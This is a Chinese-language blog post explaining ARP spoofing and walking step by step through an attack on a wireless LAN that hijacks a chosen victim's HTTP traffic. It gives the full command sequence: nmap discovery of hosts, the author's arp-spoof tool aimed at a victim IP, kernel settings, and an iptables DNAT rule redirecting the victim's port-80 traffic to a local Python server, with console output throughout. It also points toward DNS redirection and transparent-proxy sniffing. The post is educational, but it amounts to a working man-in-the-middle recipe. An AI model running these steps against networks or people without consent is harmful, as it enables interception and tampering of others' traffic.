---
layout: post
title: "ARP spoofing"
subtitle: "通过 ARP 欺骗劫持 HTTP 流量"
date: 2019-02-15 17:48
tags: 
    - TCP/IP
    - Linux
---

主机上线到一个网络之后会获得至少一个 IP 地址（比如 DHCP 或静态地址）。IP 地址能反映网络的拓扑结构，但 IP 地址并不能唯一地标识一个网络接口；能够唯一标识一个网卡的是在制造出厂时写入的 6 字节的 MAC 地址。一个 IP 数据包在到达另一个接口之前，需要知道目的地 IP 地址的 MAC 地址。ARP 就是一个将 IP 地址解析为 MAC 地址的协议，而一个基于以太网之上的 ARP 数据包结构如下

![Internet Protocol(IPv4) over Ethernet ARP packet]({{ "img/arp-spoofing-packet.png" | absolute_url }})

由于 ARP 的使用者不检查 ARP 数据包的真实性，ARP 的请求和应答容易受到第三者的干扰，特别是在一些共享介质的链路（比如无线局域网）。在多数情况下，攻击者将自身的 MAC 地址和网关的 IP 写入 ARP 应答，向受害者发送这个虚假的 ARP 应答，把自己伪装成网关并拦截了受害者的数据包。这种网络攻击被成为 ARP 欺骗(ARP spoofing)，也是一种主动嗅探(active sniffing)，对应被动嗅探(passive sniffing, 比如在共享介质链路中将网卡置于混杂模式)。

下文记录一个在无线局域网中实施 ARP 攻击并劫持 HTTP 流量到服务器 demo 的过程。[这个发送 ARP 应答的程序](https://github.com/kennico/arp-spoofing) 使用到 libpcap 而且直接从系统的 ARP 缓存获取 IP 地址对应的 MAC 地址。

- OS: Ubuntu 16.04 x64
- Requirement: libpcap, nmap，python 3.5

首先通过 `ipconfig -a` 决定要用来实施攻击的网卡名称，以及对应的网段

```
kenny@kenny-X450LD:~$ ifconfig
wlan0     Link encap:Ethernet  HWaddr 11:22:33:44:55:66  
          inet addr:192.168.43.24  Bcast:192.168.43.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:24 errors:0 dropped:244 overruns:0 frame:0
          TX packets:74 errors:0 dropped:1 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:7509332 (7.5 MB)  TX bytes:1491944 (1.4 MB)
```

在这里我用的是 `wlan0`，网段为 192.168.43.24/24。然后使用
`nmap` 发现局域网的其他主机。选项 `-sn` 表示不进行端口扫描以节省时间：

```
kenny@kenny-X450LD:~$ sudo nmap -sn 192.168.43.24/24

Starting Nmap 7.01 ( https://nmap.org ) at 2019-02-15 20:55 CST
Nmap scan report for 192.168.43.1
Host is up (0.12s latency).
MAC Address: 22:39:56:76:90:6B (Unknown)
Nmap scan report for Kennico (192.168.43.79)
Host is up (0.075s latency).
MAC Address: 24:1B:7A:10:14:FC (Unknown)
Nmap scan report for kenny-X450LD (192.168.43.24)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 11.26 seconds
```

如果不使用 root 权限， `nmap` 会显示设备的名称而不是 MAC 地址。接下来选择 192.168.43.79(24:1B:7A:10:14:FC) 作为受害者。

由于我实现的程序使用系统 ARP 缓存，需要先添加这个记录到 ARP 缓存（同样需要 root 权限）：

```
kenny@kenny-X450LD:~$ sudo arp -s 192.168.43.79 24:1B:7A:10:14:FC
kenny@kenny-X450LD:~$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.43.79            ether   24:1b:7a:10:14:fc   CM                    wlan0
192.168.43.1             ether   22:39:56:76:90:6b   C                     wlan0
```

接下来运行发送 ARP 应答的程序。libpcap 的 `pcap_open_live` 函数需要 root 权限：

```
kenny@kenny-X450LD:~$ sudo ./arp-spoof -e wlan0 192.168.43.79
DEBUG: get_gateway_ip - Command: route -n | grep -P '^0\.0\.0\.0.+UG.+wlx502b73dc543f$'
DEBUG: Command: arp -n | awk '$0 !~ "incomplete"' | grep -oP '(\w{2}:){5}\w{2}|((\d+\.){3}\d+)'
DEBUG: device "wlan0" opened successfully.
DEBUG: ip=192.168.43.79 secs=10 pkts=-1 twoway=0
Attacking 192.168.43.79(24:1B:7A:10:14:FC)...
```

选项 `-e` 指定网卡；`-n` 为两次发送的时间间隔，以秒为单位；`-c` 表示发送应答的数目，缺省则一直循环。接着拉起一个 HTTP 服务器 demo：

```python
#
# python3 http_server.py
#
from http.server import SimpleHTTPRequestHandler
from socketserver import ThreadingTCPServer

page = """
<html>
<header><title>This is title</title></header>
<body>
Hello world
</body>
</html>
"""

class demoHttpRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Connection', 'close')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(page.encode('utf-8'))

if __name__ == '__main__':
    try:
        httpd = ThreadingTCPServer(('127.0.0.1', 8080), demoHttpRequestHandler)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('httpd exits.')
```

服务器监听 127.0.0.1:8080。因为服务器 demo 监听 127.0.0.1，需要配置系统以允许转发所谓的“火星数据包([Martian packet](https://en.wikipedia.org/wiki/Martian_packet), 数据包的发送者 IP 显示这个数据包应该从另外一个接口得到)”。192.168.43.24是接口 wlan0 的IP的地址，而 127.0.0.1 是属于 lo 的 IP 地址

```sh
sudo sysctl -w net.ipv4.conf.wlan0.route_localnet=1
sudo sysctl -w net.ipv4.conf.all.route_localnet=1
```

接下来是最重要的一步：将拦截到的 HTTP 流量转发到服务器 demo:

```shell
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -s 192.168.43.79 --dport 80 -j DNAT --to-destination 127.0.0.1:8080
```
这里的 `iptables` 追加一个规则到内核的 NAT 表(`-t nat`) 的 PREROUTING 匹配链。PREROUTING 表示在选择路由之前检查满足的条件的数据包：

- 来自 wlan0 (`-i`)
- 协议为 TCP (`-p`)
- 发送者为 192.168.43.79 (`-s`)
- 接收者端口为 80

一旦匹配成功就采取行动(`-j`)，将数据包转发到 127.0.0.1:8080(`-DNAT`表示更改接收者的地址)。使用 `iptables` 还有一个好处，一些原本需要绑定到低端口(<1024)服务器，现在可以绑定到高端口，因此服务器本身 **不需要 root 权限** 。(之前花了两周时间最后也没有实现类似的端口转发功能，到头来一个下午查的一个命令就解决问题了Orz)

```
kenny@kenny-X450LD:~$ sudo iptables -t nat -L -v
Chain PREROUTING (policy ACCEPT 657 packets, 42591 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    5   320 DNAT       tcp  --  wlan0  any     192.168.43.79        anywhere             tcp dpt:http to:127.0.0.1:8080
...
```

上边列出了已有的规则。下图为受害者设备用 chrome 访问 8.8.8.8 的截图（众所周知 8.8.8.8 是谷歌公共 DNS），可见 HTML 页面即为脚本里的字符串内容：

![HTTP]({{ "img/arp-spoofing-http.png" | absolute_url }})

上图中的设备直接访问给定 IP 的 80 端口。如果要访问一个域名，则还需要用 `iptables` 转发来自 53 端口 DNS 请求；除此之外，如果要实现嗅探 HTTP/HTTPS 流量，就应该拉起来透明代理而不是那个 HTTP demo，然后打开 wireshark 就可以很方便地进行抓包（下图并未使用透明代理）。

![Wireshark]({{ "img/arp-spoofing-wireshark.png" | absolute_url }})